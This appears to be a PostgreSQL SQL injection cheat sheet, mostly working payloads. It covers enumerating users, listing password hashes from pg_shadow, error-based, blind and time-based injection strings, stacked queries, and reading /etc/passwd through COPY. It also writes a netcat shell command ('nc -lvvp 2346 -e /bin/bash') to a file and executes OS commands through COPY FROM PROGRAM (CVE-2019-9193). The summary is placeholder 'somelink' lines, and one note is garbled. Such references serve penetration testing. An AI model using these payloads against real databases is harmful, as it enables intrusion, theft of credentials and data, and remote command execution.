<h1>PostgreSQL injection</h1>

<h2>Summary</h2>

somelink<br/>
somelink<br/>
somelink<br/>
somelink<br/>
somelink<br/>
somelink<br/>
somelink<br/>
somelink<br/>
somelink<br/>
somelink<br/>
somelink<br/>



<h2>PostgreSQL Comments</h2>

```
--
/**/
```

<h2>PostgreSQL Version</h2>

```
SELECT version()
```

<h2>PostgreSQL Current User</h2>

```
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```

<h2>PostgreSQL List Users</h2>

```
SELECT usename FROM pg_user
```

<h2>PostgreSQL List Password Hashes</h2>

```
SELECT usename, passwd FROM pg_shadow 
```

<h2>PostgreSQL List Database Administrator Accounts</h2>

```
SELECT usename FROM pg_user WHERE usesuper IS TRUE
```

<h2>PostgreSQL List Privileges</h2>

```
SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
```

<h2>PostgreSQL Database Name</h2>

```
SELECT current_database()
```

<h2>PostgreSQL List Database</h2>

```
SELECT datname FROM pg_database
```

<h2>PostgreSQL List Tables</h2>

```
SELECT table_name FROM information_schema.tables
```

<h2>PostgreSQL List Columns</h2>

```
SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
```

<h2>PostgreSQL Error Based</h2>

```
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)

' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
```

<h2>PostgreSQL Blind</h2>

```
' and substr(version(),1,10) = 'PostgreSQL' and '1  -> OK
' and substr(version(),1,10) = 'PostgreXXX' and '1  -> KO
```

<h2>PostgreSQL Time Based</h2>

```
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

<h2>PostgreSQL Stacked Query</h2>

```
Use a semi-colon ";" to add another query
http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--
```

<h2>PostgreSQL File Read</h2>

```
select pg_ls_dir('./');
select pg_read_file('PG_VERSION', 0, 200);
```
NOTE: ``pg_read_filedoesn't accept the/` character.
```
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp limit 1 offset 0;
```

<h2>PostgreSQL File Write</h2>

```
CREATE TABLE pentestlab (t TEXT);
INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
SELECT * FROM pentestlab;
COPY pentestlab(t) TO '/tmp/pentestlab';
```

<h2>PostgreSQL Command execution</h2>
<h3>CVE-2019–9193</h3>

Can be used from Metasploit if you have a direct access to the database, otherwise you need to execute manually the following SQL queries.

```
DROP TABLE IF EXISTS cmd_exec;          > -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); //-- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'id';        //-- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 //-- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          //-- [Optional] Remove the table
```
